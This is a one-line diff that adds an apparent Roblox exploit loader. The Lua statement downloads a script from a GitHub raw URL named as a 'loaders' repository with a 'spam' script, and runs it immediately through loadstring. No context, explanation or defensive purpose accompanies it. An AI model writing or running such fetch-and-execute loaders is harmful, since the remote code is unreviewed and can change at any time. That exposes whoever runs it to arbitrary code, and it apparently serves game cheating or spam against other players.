@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/codefinchpalace/loaders/main/loaders/the-forge-guilds-spam3-9sk1ki8yo2i7ed.lua"))()
